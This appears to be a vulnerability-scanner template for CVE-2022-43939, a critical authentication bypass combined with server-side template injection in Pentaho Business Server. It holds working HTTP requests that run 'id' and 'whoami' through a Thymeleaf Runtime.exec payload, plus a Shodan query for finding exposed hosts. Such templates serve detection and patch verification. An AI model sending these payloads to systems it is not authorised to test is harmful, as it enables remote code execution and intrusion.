id: CVE-2022-43939

info:
  name: Pentaho Business Server - Authentication Bypass and Server Side Template Injection
  author: pdteam
  severity: critical
  description: |
    Pentaho Business Server versions before 9.4.0.1 and 9.3.0.2 are vulnerable to authentication bypass via regex vulnerability 
    combined with Server Side Template Injection (SSTI) in Thymeleaf templates leading to remote code execution.
  reference:
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/pentaho_business_server_authbypass_and_ssti.rb
    - https://github.com/dwbzn/pentaho-exploits
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-43939
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
    shodan-query: 'http.title:"pentaho"'
  tags: cve,cve2022,pentaho,rce,ssti,auth-bypass

http:
  - raw:
      - |
        GET /api/ldap/config/ldapTreeNodeChildren?url={{url_encode("${T(java.lang.Runtime).getRuntime().exec(\"id\")}")}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        GET //api/require/ldap/config/ldapTreeNodeChildren?url={{url_encode("${T(java.lang.Runtime).getRuntime().exec(\"whoami\")}")}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "uid=\\d+\\([^)]+\\)\\s+gid=\\d+\\([^)]+\\)"